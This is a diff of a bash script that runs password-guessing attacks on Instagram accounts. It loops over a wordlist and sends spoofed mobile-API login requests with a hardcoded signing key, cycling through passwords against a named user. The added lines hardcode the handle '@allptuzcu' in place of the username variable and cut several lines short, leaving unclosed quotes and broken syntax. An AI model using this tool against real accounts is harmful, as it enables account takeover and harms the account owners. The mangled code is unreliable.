@@ -57,16 +57,15 @@ function start() {
 banner
 checkroot
 dependencies
-read -p $'\e[1;92mUsername account: \e[0m' user
-checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "the page may have been removed")
-if [[ "$checkaccount" == 1 ]]; then
-printf "\e[1;91mInvalid Username! Try again\e[0m\n"
+read -p $'\e[1;92mUsername account:@allptuzcu
+checkaccount=$(curl -s https://www.instagram.com/$user/?__a=@allptuzcu
+printf "\e[1;91mInvalid Username!@allptuzcu
 sleep 1
 start
 else
-default_wl_pass="passwords.lst"
+default_wl_pass=
 read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
-wl_pass="${wl_pass:-${default_wl_pass}}"
+wl_pass="${wl_pass:
 default_threads="10"
 read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
 threads="${threads:-${default_threads}}"
@@ -135,7 +134,7 @@ IFS=$'\n'
 for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
-data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
+data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":@allptuzcu, "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 
 countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
@@ -185,7 +184,7 @@ IFS=$'\n'
 for pass in $(sed -n '/'$pass'/,'$startline'p' $wl_pass); do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
-data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
+data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":@allptuzcu, "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 
 countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
